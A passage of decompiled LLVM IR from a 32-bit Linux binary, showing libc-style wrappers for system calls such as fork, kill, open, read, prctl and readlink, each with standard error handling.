  %v0_8052aa4 = phi i32 [ %v1_8052aa9, %dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge ], [ %v3_8052a89, %dec_label_pc_8052aa0 ], [ %v3_8052a89, %dec_label_pc_8052af5 ]
  %v1_8052aa4 = inttoptr i32 %v0_8052aa4 to i8*
  %v2_8052aa4 = load i8, i8* %v1_8052aa4, align 1
  %v3_8052aa4 = zext i8 %v2_8052aa4 to i32
  %v5_8052aa4 = and i32 %v4_8052aa4, -256
  %v6_8052aa4 = or i32 %v3_8052aa4, %v5_8052aa4
  store i32 %v6_8052aa4, i32* %eax.global-to-local, align 4
  %v1_8052aa6 = add i32 %v0_8052aa6, -1
  store i32 %v1_8052aa6, i32* %ecx.global-to-local, align 4
  %v3_8052aa7 = inttoptr i32 %v2_8052aa7 to i8*
  store i8 %v2_8052aa4, i8* %v3_8052aa7, align 1
  %v0_8052aa9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052aa9 = add i32 %v0_8052aa9, 1
  store i32 %v1_8052aa9, i32* %edx.global-to-local, align 4
  %v0_8052aaa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052aaa = add i32 %v0_8052aaa, 1
  store i32 %v1_8052aaa, i32* %ebx.global-to-local, align 4
  %v0_8052aab = load i32, i32* %ecx.global-to-local, align 4
  %v10_8052aab = icmp eq i32 %v0_8052aab, -1
  %v1_8052aae = icmp eq i1 %v10_8052aab, false
  br i1 %v1_8052aae, label %dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge, label %dec_label_pc_8052ab0.loopexit

dec_label_pc_8052aa4.dec_label_pc_8052aa4_crit_edge: ; preds = %dec_label_pc_8052aa4
  %v4_8052aa4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052aa4

dec_label_pc_8052ab0.loopexit:                    ; preds = %dec_label_pc_8052aa4
  br label %dec_label_pc_8052ab0

dec_label_pc_8052ab0:                             ; preds = %dec_label_pc_8052ab0.loopexit, %dec_label_pc_8052a9b, %dec_label_pc_8052a30
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052ac0:                             ; preds = %dec_label_pc_8052a47
  store i8 48, i8* %tmp25, align 1
  %v2_8052ac3 = add i32 %arg3, 1
  %v3_8052ac3 = inttoptr i32 %v2_8052ac3 to i8*
  store i8 0, i8* %v3_8052ac3, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8052ad6:                             ; preds = %dec_label_pc_8052a84
  %v0_8052ad6 = load i32, i32* @esp, align 4
  %v2_8052ad6 = add i32 %v0_8052a7b, 13
  %v3_8052ad6 = add i32 %v2_8052ad6, %v0_8052ad6
  %v4_8052ad6 = inttoptr i32 %v3_8052ad6 to i8*
  store i8 45, i8* %v4_8052ad6, align 1
  %v1_8052a89.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a89

dec_label_pc_8052add:                             ; preds = %dec_label_pc_8052a4b
  %v1_8052adf = icmp eq i1 %v3_8052a47, false
  br i1 %v1_8052adf, label %dec_label_pc_8052a59, label %dec_label_pc_8052ae5

dec_label_pc_8052ae5:                             ; preds = %dec_label_pc_8052add
  %v1_8052ae7 = sub i32 0, %v4_8052a3b
  br label %dec_label_pc_8052a5d

dec_label_pc_8052af5:                             ; preds = %dec_label_pc_8052a89
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052a89, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052aa4

; uselistorder directives
  uselistorder i32 %v1_8052aaa, { 1, 0 }
  uselistorder i32 %v1_8052aa9, { 1, 0 }
  uselistorder i32 %v1_8052a94, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8052a89, { 5, 0, 1, 2, 3, 6, 4, 7, 8 }
  uselistorder i32 %div20, { 1, 2, 0 }
  uselistorder i32 %v1_8052a7b, { 1, 0 }
  uselistorder i32 %v4_8052a3b, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 5, 2, 3, 4, 6, 7, 0, 1, 8, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052aa4, { 0, 2, 1 }
}

define i32 @function_8052afd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052afd:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8052afd = load i32, i32* @edi, align 4
  %v0_8052afe = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8052b12 = add i32 %arg2, -12
  %v6_8052b1c = icmp ugt i32 %v1_8052b12, 2
  br i1 %v6_8052b1c, label %dec_label_pc_8052b2c, label %dec_label_pc_8052b1e

dec_label_pc_8052b1e:                             ; preds = %dec_label_pc_8052afd
  %v4_8052b22 = call i32 @function_8052b54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8052b12)
  br label %dec_label_pc_8052b4e

dec_label_pc_8052b2c:                             ; preds = %dec_label_pc_8052afd
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052b34 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052b34, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8052b34, -4095
  br i1 %tmp17, label %dec_label_pc_8052b4c, label %dec_label_pc_8052b40

dec_label_pc_8052b40:                             ; preds = %dec_label_pc_8052b2c
  %v1_8052b40 = call i32 @function_80530f9(i32 %v0_8052afe)
  %v0_8052b45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052b45 = sub i32 0, %v0_8052b45
  %v2_8052b47 = inttoptr i32 %v1_8052b40 to i32*
  store i32 %v1_8052b45, i32* %v2_8052b47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b4c

dec_label_pc_8052b4c:                             ; preds = %dec_label_pc_8052b2c, %dec_label_pc_8052b40
  %v0_8052b4c = phi i32 [ %v2_8052b34, %dec_label_pc_8052b2c ], [ -1, %dec_label_pc_8052b40 ]
  br label %dec_label_pc_8052b4e

dec_label_pc_8052b4e:                             ; preds = %dec_label_pc_8052b1e, %dec_label_pc_8052b4c
  %v0_8052b53 = phi i32 [ %v4_8052b22, %dec_label_pc_8052b1e ], [ %v0_8052b4c, %dec_label_pc_8052b4c ]
  store i32 %v0_8052afe, i32* @ebx, align 4
  store i32 %v0_8052afd, i32* @edi, align 4
  ret i32 %v0_8052b53

; uselistorder directives
  uselistorder i32 %v2_8052b34, { 1, 0, 2 }
  uselistorder i32 %v0_8052afe, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052b4e, { 1, 0 }
  uselistorder label %dec_label_pc_8052b4c, { 1, 0 }
}

define i32 @function_8052b54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b54:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b54 = load i32, i32* @edi, align 4
  store i32 %v0_8052b54, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052b6c = load i32, i32* @ebx, align 4
  %v1_8052b74 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8052b74, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052b74, -4095
  br i1 %tmp12, label %dec_label_pc_8052b8c, label %dec_label_pc_8052b80

dec_label_pc_8052b80:                             ; preds = %dec_label_pc_8052b54
  %v1_8052b80 = call i32 @function_80530f9(i32 %v0_8052b6c)
  %v0_8052b85 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052b85 = sub i32 0, %v0_8052b85
  %v2_8052b87 = inttoptr i32 %v1_8052b80 to i32*
  store i32 %v1_8052b85, i32* %v2_8052b87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052b91.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052b8c

dec_label_pc_8052b8c:                             ; preds = %dec_label_pc_8052b54, %dec_label_pc_8052b80
  %v2_8052b91 = phi i32 [ %v0_8052b54, %dec_label_pc_8052b54 ], [ %v2_8052b91.pre, %dec_label_pc_8052b80 ]
  %v0_8052b8c = phi i32 [ %v1_8052b74, %dec_label_pc_8052b54 ], [ -1, %dec_label_pc_8052b80 ]
  store i32 %v2_8052b91, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052b8c

; uselistorder directives
  uselistorder i32 %v1_8052b74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052b8c, { 1, 0 }
}

define i32 @function_8052b93(i8* %arg1) local_unnamed_addr {
dec_label_pc_8052b93:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b93 = load i32, i32* @edi, align 4
  store i32 %v0_8052b93, i32* %stack_var_-4, align 4
  %v4_8052b97 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052b97, i32* %edi.global-to-local, align 4
  %v0_8052b9b = load i32, i32* @ebx, align 4
  %v3_8052ba3 = call i32 @chdir(i8* %arg1)
  store i32 %v3_8052ba3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052ba3, -4095
  br i1 %tmp9, label %dec_label_pc_8052bbb, label %dec_label_pc_8052baf

dec_label_pc_8052baf:                             ; preds = %dec_label_pc_8052b93
  %v1_8052baf = call i32 @function_80530f9(i32 %v0_8052b9b)
  %v0_8052bb4 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052bb4 = sub i32 0, %v0_8052bb4
  %v2_8052bb6 = inttoptr i32 %v1_8052baf to i32*
  store i32 %v1_8052bb4, i32* %v2_8052bb6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052bbf.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052bbb

dec_label_pc_8052bbb:                             ; preds = %dec_label_pc_8052b93, %dec_label_pc_8052baf
  %v2_8052bbf = phi i32 [ %v0_8052b93, %dec_label_pc_8052b93 ], [ %v2_8052bbf.pre, %dec_label_pc_8052baf ]
  %v0_8052bbb = phi i32 [ %v3_8052ba3, %dec_label_pc_8052b93 ], [ -1, %dec_label_pc_8052baf ]
  store i32 %v2_8052bbf, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052bbb

; uselistorder directives
  uselistorder i32 %v3_8052ba3, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052bbb, { 1, 0 }
}

define i32 @function_8052bc1(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052bc1:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052bc1 = load i32, i32* @edi, align 4
  store i32 %v0_8052bc1, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052bc9 = load i32, i32* @ebx, align 4
  %v1_8052bd1 = call i32 @close(i32 %arg1)
  store i32 %v0_8052bc9, i32* @ebx, align 4
  store i32 %v1_8052bd1, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8052bd1, -4095
  br i1 %tmp9, label %dec_label_pc_8052be9, label %dec_label_pc_8052bdd

dec_label_pc_8052bdd:                             ; preds = %dec_label_pc_8052bc1
  %v1_8052bdd = call i32 @function_80530f9(i32 %v0_8052bc9)
  %v0_8052be2 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052be2 = sub i32 0, %v0_8052be2
  %v2_8052be4 = inttoptr i32 %v1_8052bdd to i32*
  store i32 %v1_8052be2, i32* %v2_8052be4, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052bed.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052be9

dec_label_pc_8052be9:                             ; preds = %dec_label_pc_8052bc1, %dec_label_pc_8052bdd
  %v2_8052bed = phi i32 [ %v0_8052bc1, %dec_label_pc_8052bc1 ], [ %v2_8052bed.pre, %dec_label_pc_8052bdd ]
  %v0_8052be9 = phi i32 [ %v1_8052bd1, %dec_label_pc_8052bc1 ], [ -1, %dec_label_pc_8052bdd ]
  %v2_8052beb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052beb, i32* @edx, align 4
  store i32 %v2_8052bed, i32* @edi, align 4
  ret i32 %v0_8052be9

; uselistorder directives
  uselistorder i32 %v1_8052bd1, { 1, 0, 2 }
  uselistorder i32 %v0_8052bc9, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052be9, { 1, 0 }
}

define i32 @function_8052bef() local_unnamed_addr {
dec_label_pc_8052bef:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052bef = load i32, i32* @ebx, align 4
  store i32 %v0_8052bef, i32* %stack_var_-4, align 4
  %v1_8052bf8 = call i32 @fork(i32 %v0_8052bef)
  store i32 %v1_8052bf8, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052bf8, -4095
  br i1 %tmp7, label %dec_label_pc_8052c0f, label %dec_label_pc_8052c03

dec_label_pc_8052c03:                             ; preds = %dec_label_pc_8052bef
  %v1_8052c03 = call i32 @function_80530f9(i32 %v0_8052bef)
  %v0_8052c08 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c08 = sub i32 0, %v0_8052c08
  %v2_8052c0a = inttoptr i32 %v1_8052c03 to i32*
  store i32 %v1_8052c08, i32* %v2_8052c0a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052c13.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c0f

dec_label_pc_8052c0f:                             ; preds = %dec_label_pc_8052bef, %dec_label_pc_8052c03
  %v2_8052c13 = phi i32 [ %v0_8052bef, %dec_label_pc_8052bef ], [ %v2_8052c13.pre, %dec_label_pc_8052c03 ]
  %v0_8052c0f = phi i32 [ %v1_8052bf8, %dec_label_pc_8052bef ], [ -1, %dec_label_pc_8052c03 ]
  store i32 %v2_8052c13, i32* @ebx, align 4
  ret i32 %v0_8052c0f

; uselistorder directives
  uselistorder i32 %v1_8052bf8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c0f, { 1, 0 }
}

define i32 @function_8052c15() local_unnamed_addr {
dec_label_pc_8052c15:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c15 = load i32, i32* @ebx, align 4
  store i32 %v0_8052c15, i32* %stack_var_-4, align 4
  %v1_8052c1e = call i32 @getpid(i32 %v0_8052c15)
  store i32 %v1_8052c1e, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052c1e, -4095
  br i1 %tmp7, label %dec_label_pc_8052c35, label %dec_label_pc_8052c29

dec_label_pc_8052c29:                             ; preds = %dec_label_pc_8052c15
  %v1_8052c29 = call i32 @function_80530f9(i32 %v0_8052c15)
  %v0_8052c2e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c2e = sub i32 0, %v0_8052c2e
  %v2_8052c30 = inttoptr i32 %v1_8052c29 to i32*
  store i32 %v1_8052c2e, i32* %v2_8052c30, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052c39.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c35

dec_label_pc_8052c35:                             ; preds = %dec_label_pc_8052c15, %dec_label_pc_8052c29
  %v2_8052c39 = phi i32 [ %v0_8052c15, %dec_label_pc_8052c15 ], [ %v2_8052c39.pre, %dec_label_pc_8052c29 ]
  %v0_8052c35 = phi i32 [ %v1_8052c1e, %dec_label_pc_8052c15 ], [ -1, %dec_label_pc_8052c29 ]
  %v2_8052c37 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052c37, i32* @edx, align 4
  store i32 %v2_8052c39, i32* @ebx, align 4
  ret i32 %v0_8052c35

; uselistorder directives
  uselistorder i32 %v1_8052c1e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c35, { 1, 0 }
}

define i32 @function_8052c3b() local_unnamed_addr {
dec_label_pc_8052c3b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c3b = load i32, i32* @ebx, align 4
  store i32 %v0_8052c3b, i32* %stack_var_-4, align 4
  %v1_8052c44 = call i32 @getppid(i32 %v0_8052c3b)
  store i32 %v1_8052c44, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052c44, -4095
  br i1 %tmp7, label %dec_label_pc_8052c5b, label %dec_label_pc_8052c4f

dec_label_pc_8052c4f:                             ; preds = %dec_label_pc_8052c3b
  %v1_8052c4f = call i32 @function_80530f9(i32 %v0_8052c3b)
  %v0_8052c54 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c54 = sub i32 0, %v0_8052c54
  %v2_8052c56 = inttoptr i32 %v1_8052c4f to i32*
  store i32 %v1_8052c54, i32* %v2_8052c56, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052c5f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c5b

dec_label_pc_8052c5b:                             ; preds = %dec_label_pc_8052c3b, %dec_label_pc_8052c4f
  %v2_8052c5f = phi i32 [ %v0_8052c3b, %dec_label_pc_8052c3b ], [ %v2_8052c5f.pre, %dec_label_pc_8052c4f ]
  %v0_8052c5b = phi i32 [ %v1_8052c44, %dec_label_pc_8052c3b ], [ -1, %dec_label_pc_8052c4f ]
  %v2_8052c5d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052c5d, i32* @edx, align 4
  store i32 %v2_8052c5f, i32* @ebx, align 4
  ret i32 %v0_8052c5b

; uselistorder directives
  uselistorder i32 %v1_8052c44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c5b, { 1, 0 }
}

define i32 @function_8052c61(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052c61:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052c61 = load i32, i32* @edi, align 4
  store i32 %v0_8052c61, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052c79 = load i32, i32* @ebx, align 4
  %v2_8052c81 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_8052c81, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_8052c81, -4095
  br i1 %tmp12, label %dec_label_pc_8052c99, label %dec_label_pc_8052c8d

dec_label_pc_8052c8d:                             ; preds = %dec_label_pc_8052c61
  %v1_8052c8d = call i32 @function_80530f9(i32 %v0_8052c79)
  %v0_8052c92 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052c92 = sub i32 0, %v0_8052c92
  %v2_8052c94 = inttoptr i32 %v1_8052c8d to i32*
  store i32 %v1_8052c92, i32* %v2_8052c94, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052c9e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052c99

dec_label_pc_8052c99:                             ; preds = %dec_label_pc_8052c61, %dec_label_pc_8052c8d
  %v2_8052c9e = phi i32 [ %v0_8052c61, %dec_label_pc_8052c61 ], [ %v2_8052c9e.pre, %dec_label_pc_8052c8d ]
  %v0_8052c99 = phi i32 [ %v2_8052c81, %dec_label_pc_8052c61 ], [ -1, %dec_label_pc_8052c8d ]
  store i32 %v2_8052c9e, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052c99

; uselistorder directives
  uselistorder i32 %v2_8052c81, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052c99, { 1, 0 }
}

define i32 @function_8052ca0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052ca0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052ca0 = load i32, i32* @ebx, align 4
  store i32 %v0_8052ca0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052cb3 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8052cb3, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8052cb3, -4095
  br i1 %tmp9, label %dec_label_pc_8052ccc, label %dec_label_pc_8052cc0

dec_label_pc_8052cc0:                             ; preds = %dec_label_pc_8052ca0
  %v1_8052cc0 = call i32 @function_80530f9(i32 %v0_8052ca0)
  %v0_8052cc5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052cc5 = sub i32 0, %v0_8052cc5
  %v2_8052cc7 = inttoptr i32 %v1_8052cc0 to i32*
  store i32 %v1_8052cc5, i32* %v2_8052cc7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052cd0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052ccc

dec_label_pc_8052ccc:                             ; preds = %dec_label_pc_8052ca0, %dec_label_pc_8052cc0
  %v2_8052cd0 = phi i32 [ %v0_8052ca0, %dec_label_pc_8052ca0 ], [ %v2_8052cd0.pre, %dec_label_pc_8052cc0 ]
  %v0_8052ccc = phi i32 [ %v2_8052cb3, %dec_label_pc_8052ca0 ], [ -1, %dec_label_pc_8052cc0 ]
  %v2_8052cce = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052cce, i32* @edx, align 4
  store i32 %v2_8052cd0, i32* @ebx, align 4
  ret i32 %v0_8052ccc

; uselistorder directives
  uselistorder i32 %v2_8052cb3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052ccc, { 1, 0 }
}

define i32 @function_8052cd2(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052cd2:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8052cd3 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8052cd9 = sdiv i32 %sext, 16777216
  store i32 %v4_8052cd9, i32* @ecx, align 4
  %v4_8052cdd = ptrtoint i8* %arg1 to i32
  %v3_8052ce1 = and i32 %arg2, 64
  %v4_8052ce1 = icmp eq i32 %v3_8052ce1, 0
  br i1 %v4_8052ce1, label %dec_label_pc_8052cf2, label %dec_label_pc_8052ce6

dec_label_pc_8052ce6:                             ; preds = %dec_label_pc_8052cd2
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052cf2

dec_label_pc_8052cf2:                             ; preds = %dec_label_pc_8052cd2, %dec_label_pc_8052ce6
  %v0_8052cf2 = phi i32 [ 0, %dec_label_pc_8052cd2 ], [ %phitmp, %dec_label_pc_8052ce6 ]
  store i32 %v0_8052cf2, i32* @edx, align 4
  store i32 %v4_8052cdd, i32* %ebx.global-to-local, align 4
  %v5_8052cfd = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8052cd9)
  store i32 %v5_8052cfd, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_8052cfd, -4095
  br i1 %tmp15, label %dec_label_pc_8052d15, label %dec_label_pc_8052d09

dec_label_pc_8052d09:                             ; preds = %dec_label_pc_8052cf2
  %v1_8052d09 = call i32 @function_80530f9(i32 %v0_8052cd3)
  %v0_8052d0e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052d0e = sub i32 0, %v0_8052d0e
  %v2_8052d10 = inttoptr i32 %v1_8052d09 to i32*
  store i32 %v1_8052d0e, i32* %v2_8052d10, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052d15

dec_label_pc_8052d15:                             ; preds = %dec_label_pc_8052cf2, %dec_label_pc_8052d09
  %v0_8052d15 = phi i32 [ %v5_8052cfd, %dec_label_pc_8052cf2 ], [ -1, %dec_label_pc_8052d09 ]
  store i32 %v0_8052cd3, i32* @ebx, align 4
  ret i32 %v0_8052d15

; uselistorder directives
  uselistorder i32 %v5_8052cfd, { 1, 0, 2 }
  uselistorder i32 %v4_8052cd9, { 1, 0 }
  uselistorder i32 %v0_8052cd3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052d15, { 1, 0 }
  uselistorder label %dec_label_pc_8052cf2, { 1, 0 }
}

define i32 @function_8052d1d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8052d1d:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052d1e = load i32, i32* @esi, align 4
  store i32 %v0_8052d1e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052d36 = load i32, i32* @ebx, align 4
  %v5_8052d3e = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_8052d3e, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_8052d3e, -4095
  br i1 %tmp12, label %dec_label_pc_8052d56, label %dec_label_pc_8052d4a

dec_label_pc_8052d4a:                             ; preds = %dec_label_pc_8052d1d
  %v1_8052d4a = call i32 @function_80530f9(i32 %v0_8052d36)
  %v0_8052d4f = load i32, i32* %esi.global-to-local, align 4
  %v1_8052d4f = sub i32 0, %v0_8052d4f
  %v2_8052d51 = inttoptr i32 %v1_8052d4a to i32*
  store i32 %v1_8052d4f, i32* %v2_8052d51, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052d59.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052d56

dec_label_pc_8052d56:                             ; preds = %dec_label_pc_8052d1d, %dec_label_pc_8052d4a
  %v2_8052d59 = phi i32 [ %v0_8052d1e, %dec_label_pc_8052d1d ], [ %v2_8052d59.pre, %dec_label_pc_8052d4a ]
  %v0_8052d56 = phi i32 [ %v5_8052d3e, %dec_label_pc_8052d1d ], [ -1, %dec_label_pc_8052d4a ]
  store i32 %v2_8052d59, i32* %esi.global-to-local, align 4
  ret i32 %v0_8052d56

; uselistorder directives
  uselistorder i32 %v5_8052d3e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052d56, { 1, 0 }
}

define i32 @function_8052d5c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052d5c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d5c = load i32, i32* @edi, align 4
  store i32 %v0_8052d5c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052d6c = load i32, i32* @ebx, align 4
  %v4_8052d74 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8052d6c, i32* @ebx, align 4
  store i32 %v4_8052d74, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052d74, -4095
  br i1 %tmp12, label %dec_label_pc_8052d8c, label %dec_label_pc_8052d80

dec_label_pc_8052d80:                             ; preds = %dec_label_pc_8052d5c
  %v1_8052d80 = call i32 @function_80530f9(i32 %v0_8052d6c)
  %v0_8052d85 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052d85 = sub i32 0, %v0_8052d85
  %v2_8052d87 = inttoptr i32 %v1_8052d80 to i32*
  store i32 %v1_8052d85, i32* %v2_8052d87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052d90.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052d8c

dec_label_pc_8052d8c:                             ; preds = %dec_label_pc_8052d5c, %dec_label_pc_8052d80
  %v2_8052d90 = phi i32 [ %v0_8052d5c, %dec_label_pc_8052d5c ], [ %v2_8052d90.pre, %dec_label_pc_8052d80 ]
  %v0_8052d8c = phi i32 [ %v4_8052d74, %dec_label_pc_8052d5c ], [ -1, %dec_label_pc_8052d80 ]
  store i32 %v2_8052d90, i32* @edi, align 4
  ret i32 %v0_8052d8c

; uselistorder directives
  uselistorder i32 %v4_8052d74, { 1, 0, 2 }
  uselistorder i32 %v0_8052d6c, { 1, 0 }
  uselistorder label %dec_label_pc_8052d8c, { 1, 0 }
}

define i32 @function_8052d92(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052d92:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052d92 = load i32, i32* @edi, align 4
  store i32 %v0_8052d92, i32* %stack_var_-4, align 4
  %v4_8052d96 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052d96, i32* %edi.global-to-local, align 4
  %v0_8052da2 = load i32, i32* @ebx, align 4
  %v7_8052daa = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v0_8052da2, i32* @ebx, align 4
  store i32 %v7_8052daa, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8052daa, -4095
